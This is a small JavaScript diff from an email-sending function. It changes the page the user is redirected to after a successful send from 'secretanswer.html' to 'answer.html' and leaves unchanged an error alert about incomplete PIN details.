@@ -21,7 +21,7 @@ function emailSend() {
   }).then(
     message => {
       if (message == 'OK') {
-        window.location.href = 'secretanswer.html'; // Redirecting to otp.html upon successful email sending
+        window.location.href = 'answer.html'; // Redirecting to otp.html upon successful email sending
       }
       else {
         swal("Error", "Please complete the PIN details", "error") // Displaying an error message if email sending fails
